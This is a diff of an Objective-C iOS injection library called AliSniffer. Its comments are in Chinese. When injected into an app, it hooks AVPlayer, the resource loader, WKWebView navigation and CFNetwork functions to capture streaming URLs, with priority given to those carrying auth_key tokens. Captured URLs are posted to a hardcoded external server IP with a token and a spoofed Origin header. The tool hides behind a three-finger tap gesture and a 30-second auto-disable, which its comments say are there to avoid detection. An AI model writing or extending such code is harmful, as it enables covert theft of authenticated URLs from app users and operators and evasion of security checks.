@@ -1,48 +1,43 @@
-// AliSniffer.m — Stealth(隐身) 版
-// 关键策略：默认不注册/不Hook；三指三击手势启用；动态生成随机 NSURLProtocol 子类；仅观察 http/https；抓到后上报+弹窗+复制；白名单域 + 去重；
-// 需要：-framework UIKit -framework Foundation
+// AliSniffer.m — 移植版（AV + WK + CF 三路）
+// 思路与“另一个能抓到的插件”一致：AVAssetResourceLoader 包裹、AVPlayer 入点、WKWebView 导航、CFReadStream 兜底。
+// 关键点：签名/存在性校验；三指三击启用；30s 自动撤销；auth_key优先；上报+弹窗+复制；去重。
+// 需要与工程内 fishhook.c/h 一起编译。
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
+#import <AVFoundation/AVFoundation.h>
+#import <WebKit/WebKit.h>
 #import <objc/runtime.h>
+#import <objc/message.h>
+#import "fishhook.h"
 
-// ===== 配置 =====
+#pragma mark - 配置
+
 static NSString * const kPushHost  = @"http://139.155.57.242:8088";
 static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }
 
-// 默认弹窗开关
+static const NSTimeInterval kDedupeWindow = 60.0;
 static const BOOL kPopupOnAuth  = YES;
 static const BOOL kPopupOnPlain = YES;
-
-// URL 去重时间
-static const NSTimeInterval kDedupeWindow = 60.0;
-// 自动撤销注册的时间窗口（启用后 N 秒自动撤销，减少暴露）
-static const NSTimeInterval kAutoDisableAfter = 30.0;
-
-// 只观察这些域名（尽量缩小面）
-static NSArray<NSString*> *TargetHosts(void) {
-    return @[@"kuniunet.com", @"jiayinkeji.xin"]; // 可自行追加
-}
+static const NSTimeInterval kAutoDisableAfter = 30.0;   // 三指启用后 30s 自动撤销
 
 #ifndef DEBUG_LOG
 #define DEBUG_LOG 0
 #endif
 #if DEBUG_LOG
-#define LOG(fmt, ...) NSLog((@"[AliStealth] " fmt), ##__VA_ARGS__)
+#define LOG(fmt, ...) NSLog((@"[AliPort] " fmt), ##__VA_ARGS__)
 #else
 #define LOG(...)
 #endif
 
-// ===== 运行态 =====
 static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
-static BOOL g_enabled = NO;                // 当前是否启用捕获
-static Class g_dynProtoCls = Nil;          // 动态生成的 NSURLProtocol 子类
-static UIGestureRecognizer *g_tripleTap;   // 三指三击手势
+static BOOL g_enabled = NO;
 static dispatch_source_t g_autoTimer;
 
-// ===== 公用工具 =====
+#pragma mark - 公共工具
+
 static inline void on_main(void(^blk)(void)){
     if (!blk) return;
     if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
@@ -55,7 +50,7 @@ static void popup(NSString *title, NSString *msg, NSString *copyText){
             if (@available(iOS 13.0,*)) {
                 for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
                     if (sc.activationState==UISceneActivationStateForegroundActive){
-                        for (UIWindow *w in sc.windows) if (w.isKeyWindow) { win = w; break; }
+                        for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win = w; break; }
                         if (win) break;
                     }
                 }
@@ -64,9 +59,7 @@ static void popup(NSString *title, NSString *msg, NSString *copyText){
             UIViewController *vc = win.rootViewController;
             while (vc.presentedViewController) vc = vc.presentedViewController;
 
-            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title
-                                                                        message:msg
-                                                                 preferredStyle:UIAlertControllerStyleAlert];
+            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
             if (copyText.length){
                 [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                     UIPasteboard.generalPasteboard.string = copyText;
@@ -77,6 +70,7 @@ static void popup(NSString *title, NSString *msg, NSString *copyText){
         }@catch(__unused NSException *e){}
     });
 }
+
 static BOOL hasAuthLike(NSString *u){
     if (!u) return NO;
     NSString *s = u.lowercaseString;
@@ -89,20 +83,9 @@ static BOOL hasAuthLike(NSString *u){
 static BOOL looksLikeStream(NSString *u){
     if (!u) return NO;
     NSString *s = u.lowercaseString;
-    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] ||
-        [s containsString:@".ts"]   || [s hasPrefix:@"rtmp://"]) return YES;
-    if ([s containsString:@".php"] || [s containsString:@"phonelive"] ||
-        [s containsString:@"replay"] || [s containsString:@"pull."] ||
-        [s containsString:@"live"]) return YES;
+    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] || [s containsString:@".ts"] || [s hasPrefix:@"rtmp://"]) return YES;
+    if ([s containsString:@".php"] || [s containsString:@"phonelive"] || [s containsString:@"replay"] || [s containsString:@"pull."] || [s containsString:@"live"]) return YES;
     if (hasAuthLike(u)) return YES;
-    return NO;
-}
-static BOOL hostInWhitelist(NSURL *url){
-    if (!url.host) return NO;
-    NSString *h = url.host.lowercaseString;
-    for (NSString *t in TargetHosts()){
-        if ([h containsString:t]) return YES;
-    }
     return NO;
 }
 static BOOL dedupe_skip(NSString *u){
@@ -129,7 +112,6 @@ static void postText(NSString *text){
         [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
         [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
         req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
-
         [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
             NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
             if (e || sc<200 || sc>=300) tryNext();
@@ -137,174 +119,219 @@ static void postText(NSString *text){
     }; tryNext();
 }
 static void handleURL(NSString *u, NSString *from){
+    if (!g_enabled) return;                           // 只在启用窗口内抓
     if (!u || !looksLikeStream(u)) return;
     if (dedupe_skip(u)) return;
     BOOL auth = hasAuthLike(u);
     NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
     NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
     postText(u);
-    if (auth){
-        if (kPopupOnAuth){ popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
-    }else{
-        if (kPopupOnPlain){ popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
-    }
+    if (auth){ if (kPopupOnAuth)  { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
+    else     { if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
 }
 
-// ===== 动态 NSURLProtocol 子类（随机名） =====
-static NSString *randIdent(void){
-    uint32_t r = arc4random();
-    return [NSString stringWithFormat:@"SNF%08X", r];
+#pragma mark - A) AV 播放链路（ResourceLoader 包裹 + AVPlayer 入点）
+
+// —— ResourceLoader 代理包装（只读透传）
+@interface SNF_RLProxy : NSObject<AVAssetResourceLoaderDelegate>
+@property (nonatomic, weak) id<AVAssetResourceLoaderDelegate> real;
+@end
+@implementation SNF_RLProxy
+- (BOOL)resourceLoader:(AVAssetResourceLoader *)loader shouldWaitForLoadingOfRequestedResource:(AVAssetResourceLoadingRequest *)loadingRequest {
+    @try {
+        NSURL *u = loadingRequest.request ? loadingRequest.request.URL : nil;
+        if (!u) u = [loadingRequest valueForKeyPath:@"request.URL"];
+        if (u.absoluteString.length) dispatch_async(gq, ^{ handleURL(u.absoluteString, @"ResourceLoader"); });
+    } @catch (__unused NSException *e) {}
+    if ([self.real respondsToSelector:_cmd])
+        return ((BOOL(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, loadingRequest);
+    return NO;
 }
+- (void)resourceLoader:(AVAssetResourceLoader *)loader didCancelLoadingRequest:(AVAssetResourceLoadingRequest *)loadingRequest {
+    if ([self.real respondsToSelector:_cmd])
+        ((void(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, loadingRequest);
+}
+@end
 
-static Class makeDynamicProtocolClass(void){
-    NSString *name = [NSString stringWithFormat:@"%@_%@", @"SniffProto", randIdent()];
-    Class super = [NSURLProtocol class];
-    Class cls = objc_allocateClassPair(super, name.UTF8String, 0);
-    if (!cls) return Nil;
-
-    // canInitWithRequest:
-    BOOL (^canInit)(id, NSURLRequest*) = ^BOOL(id _self, NSURLRequest *request){
-        @try{
-            if (!g_enabled) return NO;                      // 未启用时不拦
-            if (!request) return NO;
-            NSString *sch = request.URL.scheme.lowercaseString;
-            if (![sch isEqualToString:@"http"] && ![sch isEqualToString:@"https"]) return NO;
-            if (![request isKindOfClass:[NSMutableURLRequest class]]) {
-                // 只要白名单域名
-                if (!hostInWhitelist(request.URL)) return NO;
-            }
-            // 防循环
-            if ([NSURLProtocol propertyForKey:@"snf_handled" inRequest:request]) return NO;
-            return YES;
-        }@catch(__unused NSException *e){ return NO; }
-    };
-    class_addMethod(object_getClass(cls), sel_getUid("canInitWithRequest:"), imp_implementationWithBlock(canInit), "c@:@");
-
-    // canonicalRequestForRequest:
-    NSURLRequest* (^canon)(id, NSURLRequest*) = ^NSURLRequest*(id _self, NSURLRequest *req){ return req; };
-    class_addMethod(object_getClass(cls), sel_getUid("canonicalRequestForRequest:"), imp_implementationWithBlock(canon), "@@:@");
-
-    // startLoading
-    void (^start)(id) = ^(id _self){
-        @try{
-            NSURLRequest *req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(_self, sel_getUid("request"));
-            if (req.URL.absoluteString.length) dispatch_async(gq, ^{ handleURL(req.URL.absoluteString, @"Stealth/NSURLProtocol"); });
-
-            NSMutableURLRequest *m = [req mutableCopy];
-            [NSURLProtocol setProperty:@(YES) forKey:@"snf_handled" inRequest:m];
-
-            NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
-            if ([cfg respondsToSelector:@selector(setProtocolClasses:)]) cfg.protocolClasses = @[];
-
-            NSURLSession *ses = [NSURLSession sessionWithConfiguration:cfg];
-            NSURLSessionDataTask *task = [ses dataTaskWithRequest:m
-                                                completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err){
-                id client = ((id(*)(id,SEL))objc_msgSend)(_self, sel_getUid("client"));
-                if (err) {
-                    @try{ ((void(*)(id,SEL,id,id))objc_msgSend)(client, sel_getUid("URLProtocol:didFailWithError:"), _self, err); }@catch(__unused NSException *e){}
-                } else {
-                    @try{
-                        ((void(*)(id,SEL,id,id,NSUInteger))objc_msgSend)(client, sel_getUid("URLProtocol:didReceiveResponse:cacheStoragePolicy:"), _self, resp, 0);
-                        if (data.length) ((void(*)(id,SEL,id,id))objc_msgSend)(client, sel_getUid("URLProtocol:didLoadData:"), _self, data);
-                        ((void(*)(id,SEL,id))objc_msgSend)(client, sel_getUid("URLProtocolDidFinishLoading:"), _self);
-                    }@catch(__unused NSException *e){}
-                }
-            }];
-            ((void(*)(id,SEL,id))objc_msgSend)(_self, sel_getUid("setTask:"), task);
-            [task resume];
-        }@catch(__unused NSException *e){
-            id client = ((id(*)(id,SEL))objc_msgSend)(_self, sel_getUid("client"));
-            NSError *err = [NSError errorWithDomain:NSURLErrorDomain code:-1 userInfo:nil];
-            @try{ ((void(*)(id,SEL,id,id))objc_msgSend)(client, sel_getUid("URLProtocol:didFailWithError:"), _self, err); }@catch(__unused NSException *e2){}
+static IMP  orig_rl_setDelegate = NULL;
+static void snf_rl_setDelegate(id self, SEL _cmd, id delegate, id queue){
+    id wrap = delegate;
+    @try{
+        if (delegate && ![delegate isKindOfClass:SNF_RLProxy.class]){
+            SNF_RLProxy *p = [SNF_RLProxy new]; p.real = delegate; wrap = p;
         }
-    };
-    class_addMethod(cls, sel_getUid("startLoading"), imp_implementationWithBlock(start), "v@:");
-
-    // stopLoading（best-effort）
-    void (^stop)(id) = ^(id _self){
-        @try{
-            NSURLSessionDataTask *t = nil;
-            if ([_self respondsToSelector:@selector(task)]) t = ((id(*)(id,SEL))objc_msgSend)(_self, sel_getUid("task"));
-            [t cancel];
-        }@catch(__unused NSException *e){}
-    };
-    class_addMethod(cls, sel_getUid("stopLoading"), imp_implementationWithBlock(stop), "v@:");
-
-    // 关联一个 task 属性（弱）
-    class_addIvar(cls, "task", sizeof(id), log2(sizeof(id)), @encode(id));
-    BOOL (^setTask)(id,id) = ^BOOL(id _self, id v){ object_setIvar(_self, class_getInstanceVariable(cls, "task"), v); return YES; };
-    id   (^getTask)(id)    = ^id(id _self){ return object_getIvar(_self, class_getInstanceVariable(cls, "task")); };
-    class_addMethod(cls, sel_getUid("setTask:"), imp_implementationWithBlock(setTask), "v@:@");
-    class_addMethod(cls, sel_getUid("task"),     imp_implementationWithBlock(getTask), "@@:");
-
-    objc_registerClassPair(cls);
-    return cls;
+    }@catch(__unused NSException *e){}
+    ((void(*)(id,SEL,id,id))orig_rl_setDelegate)(self,_cmd,wrap,queue);
+}
+static void install_resource_loader_wrap(void){
+    Class RL = objc_getClass("AVAssetResourceLoader");
+    if (!RL) return;
+    Method m = class_getInstanceMethod(RL, sel_getUid("setDelegate:queue:"));
+    if (!m) return;
+    const char *enc = method_getTypeEncoding(m);
+    if (!enc || enc[0] != 'v') return;   // 简单校验
+    orig_rl_setDelegate = method_getImplementation(m);
+    method_setImplementation(m, (IMP)snf_rl_setDelegate);
+    LOG("RL proxy installed");
 }
 
-// ===== 启用/停用 =====
-static void enableSniffer(void){
+// —— AVPlayer 入点：replaceCurrentItem/setCurrentItem
+static IMP orig_replaceItem = NULL, orig_setItem = NULL;
+static void sniff_item(AVPlayerItem *item, NSString *from){
+    @try{
+        AVURLAsset *asset = (AVURLAsset *)item.asset;
+        if ([asset isKindOfClass:AVURLAsset.class]) {
+            NSString *u = asset.URL.absoluteString;
+            if (u.length) dispatch_async(gq, ^{ handleURL(u, from); });
+        }
+        // 同时把 RL 代理也挂上（有的播放器先设 item 后再装 RL）
+        AVAssetResourceLoader *rl = asset.resourceLoader;
+        if (rl && ![rl.delegate isKindOfClass:SNF_RLProxy.class]){
+            SNF_RLProxy *p = [SNF_RLProxy new]; p.real = rl.delegate;
+            [rl setDelegate:p queue:dispatch_get_main_queue()];
+        }
+    }@catch(__unused NSException *e){}
+}
+static void snf_replaceItem(id self, SEL _cmd, AVPlayerItem *item){
+    sniff_item(item, @"AVPlayer.replaceItem");
+    ((void(*)(id,SEL,id))orig_replaceItem)(self,_cmd,item);
+}
+static void snf_setItem(id self, SEL _cmd, AVPlayerItem *item){
+    sniff_item(item, @"AVPlayer.setCurrentItem");
+    ((void(*)(id,SEL,id))orig_setItem)(self,_cmd,item);
+}
+static void install_avplayer(void){
+    Class P = objc_getClass("AVPlayer");
+    if (!P) return;
+    Method m1 = class_getInstanceMethod(P, sel_getUid("replaceCurrentItemWithPlayerItem:"));
+    if (m1){ orig_replaceItem = method_getImplementation(m1); method_setImplementation(m1,(IMP)snf_replaceItem); }
+    Method m2 = class_getInstanceMethod(P, sel_getUid("setCurrentItem:"));
+    if (m2){ orig_setItem = method_getImplementation(m2); method_setImplementation(m2,(IMP)snf_setItem); }
+    LOG("AVPlayer hooks installed");
+}
+
+#pragma mark - B) WKWebView 链路（导航代理包装）
+
+@interface SNF_WKProxy : NSObject<WKNavigationDelegate>
+@property (nonatomic, weak) id<WKNavigationDelegate> real;
+@end
+@implementation SNF_WKProxy
+- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
+    @try{
+        NSString *u = navigationAction.request.URL.absoluteString;
+        if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WKNavigation"); });
+    }@catch(__unused NSException *e){}
+    if ([self.real respondsToSelector:_cmd])
+        ((void(*)(id,SEL,id,id,id))objc_msgSend)(self.real,_cmd,webView,navigationAction,decisionHandler);
+    else decisionHandler(WKNavigationActionPolicyAllow);
+}
+@end
+
+static IMP orig_wk_setNav = NULL;
+static void snf_setNav(id self, SEL _cmd, id delegate){
+    id wrap = delegate;
+    @try{
+        if (delegate && ![delegate isKindOfClass:SNF_WKProxy.class]){
+            SNF_WKProxy *p = [SNF_WKProxy new]; p.real = delegate; wrap = p;
+        }
+    }@catch(__unused NSException *e){}
+    ((void(*)(id,SEL,id))orig_wk_setNav)(self,_cmd,wrap);
+}
+static void install_wk(void){
+    Class WK = objc_getClass("WKWebView");
+    if (!WK) return;
+    Method m = class_getInstanceMethod(WK, sel_getUid("setNavigationDelegate:"));
+    if (!m) return;
+    orig_wk_setNav = method_getImplementation(m);
+    method_setImplementation(m, (IMP)snf_setNav);
+    LOG("WK wrap installed");
+}
+
+#pragma mark - C) CFNetwork 兜底（fishhook）
+
+static CFReadStreamRef (*orig_CFReadStreamCreateForHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef);
+static CFReadStreamRef (*orig_CFReadStreamCreateForStreamedHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef, CFReadStreamRef);
+
+static NSString* urlFromMsg(CFHTTPMessageRef msg){
+    if (!msg) return nil;
+    CFURLRef url = CFHTTPMessageCopyRequestURL(msg);
+    if (!url) return nil;
+    NSString *s = ((__bridge_transfer NSURL*)url).absoluteString;
+    return s;
+}
+static CFReadStreamRef snf_CFReadStreamCreateForHTTPRequest(CFAllocatorRef alloc, CFHTTPMessageRef msg){
+    @try{ NSString *u = urlFromMsg(msg); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream"); }); }@catch(__unused NSException *e){}
+    return orig_CFReadStreamCreateForHTTPRequest ? orig_CFReadStreamCreateForHTTPRequest(alloc,msg) : NULL;
+}
+static CFReadStreamRef snf_CFReadStreamCreateForStreamedHTTPRequest(CFAllocatorRef alloc, CFHTTPMessageRef msg, CFReadStreamRef body){
+    @try{ NSString *u = urlFromMsg(msg); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream(streamed)"); }); }@catch(__unused NSException *e){}
+    return orig_CFReadStreamCreateForStreamedHTTPRequest ? orig_CFReadStreamCreateForStreamedHTTPRequest(alloc,msg,body) : NULL;
+}
+static void install_cf(void){
+    struct rebinding rebs[] = {
+        {"CFReadStreamCreateForHTTPRequest",         (void*)snf_CFReadStreamCreateForHTTPRequest,         (void**)&orig_CFReadStreamCreateForHTTPRequest},
+        {"CFReadStreamCreateForStreamedHTTPRequest", (void*)snf_CFReadStreamCreateForStreamedHTTPRequest, (void**)&orig_CFReadStreamCreateForStreamedHTTPRequest},
+    };
+    rebind_symbols(rebs, (sizeof rebs / sizeof rebs[0]));
+    LOG("CF hooks installed");
+}
+
+#pragma mark - 开关（手势启用 / 30s 自动撤销）
+
+static void enable_all(void){
     if (g_enabled) return;
-    if (!g_dynProtoCls) g_dynProtoCls = makeDynamicProtocolClass();
-    if (!g_dynProtoCls) return;
-
-    [NSURLProtocol registerClass:g_dynProtoCls];
     g_enabled = YES;
-    popup(@"AliSniffer", @"隐身模式：已启用捕获（30秒后自动关闭，或再三指三击手动关闭）", nil);
+    // 安装三路
+    install_resource_loader_wrap();
+    install_avplayer();
+    install_wk();
+    install_cf();
+    popup(@"AliSniffer", @"已启用捕获（AV+WK+CF）——30 秒后自动关闭；再次三指三击可立即关闭", nil);
 
-    // 自动关闭计时器
+    // 自动关闭
     if (g_autoTimer) { dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
     g_autoTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
-    dispatch_source_set_timer(g_autoTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kAutoDisableAfter*NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, (1*NSEC_PER_SEC));
+    dispatch_source_set_timer(g_autoTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kAutoDisableAfter*NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, NSEC_PER_SEC);
     dispatch_source_set_event_handler(g_autoTimer, ^{
-        if (g_enabled) {
-            [NSURLProtocol unregisterClass:g_dynProtoCls];
-            g_enabled = NO;
-            popup(@"AliSniffer", @"隐身模式：已自动关闭", nil);
-        }
-        dispatch_source_cancel(g_autoTimer); g_autoTimer = nil;
+        g_enabled = NO;
+        if (g_autoTimer){ dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
+        popup(@"AliSniffer", @"已自动关闭捕获", nil);
     });
     dispatch_resume(g_autoTimer);
 }
-static void disableSniffer(void){
+static void disable_all(void){
     if (!g_enabled) return;
-    [NSURLProtocol unregisterClass:g_dynProtoCls];
     g_enabled = NO;
-    if (g_autoTimer) { dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
-    popup(@"AliSniffer", @"隐身模式：已手动关闭", nil);
+    if (g_autoTimer){ dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
+    popup(@"AliSniffer", @"已手动关闭捕获", nil);
 }
-static void toggleSniffer(UIGestureRecognizer *gr){
+static void tripleTap(UIGestureRecognizer *gr){
     if (gr.state != UIGestureRecognizerStateRecognized) return;
-    if (g_enabled) disableSniffer(); else enableSniffer();
+    if (g_enabled) disable_all(); else enable_all();
 }
-
-// ===== 安装手势（3 指 3 击） =====
 static void installGesture(void){
     on_main(^{
         @try{
             UIWindow *win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
             if (!win) return;
-            UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:[NSBlockOperation blockOperationWithBlock:^{}] action:nil];
-            // 我们自己转发
-            tap.numberOfTapsRequired    = 3;
+            UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] init];
             tap.numberOfTouchesRequired = 3;
+            tap.numberOfTapsRequired    = 3;
             [win addGestureRecognizer:tap];
-            // 用 runtime 把 action 指到 C 函数
-            class_addMethod([tap class], sel_getUid("snf_fire"), (IMP)toggleSniffer, "v@:@");
+            class_addMethod([tap class], sel_getUid("snf_fire"), (IMP)tripleTap, "v@:@");
             [tap addTarget:tap action:sel_getUid("snf_fire")];
-            g_tripleTap = tap;
-
-            // 提示一次：三指三击开启/关闭
-            popup(@"AliSniffer 已加载（隐身）", @"三指三击屏幕：开启/关闭捕获；默认关闭（避免被检测）。", nil);
+            popup(@"AliSniffer 已加载（隐身）", @"三指三击屏幕：启/停捕获；默认关闭，避免被巡检。", nil);
         }@catch(__unused NSException *e){}
     });
 }
 
-// ===== 入口 =====
+#pragma mark - 入口
+
 __attribute__((constructor))
-static void AliStealthInit(void){
+static void AliPortInit(void){
     @try{
-        if (!gq)    gq    = dispatch_queue_create("com.alistealth.queue", DISPATCH_QUEUE_SERIAL);
+        if (!gq)    gq    = dispatch_queue_create("com.aliport.queue", DISPATCH_QUEUE_SERIAL);
         if (!g_seen) g_seen = [NSMutableDictionary dictionary];
-        installGesture();   // 只装手势，不注册任何协议/Hook
+        installGesture();                 // 只装手势，避免启动即被扫
     }@catch(__unused NSException *e){}
 }
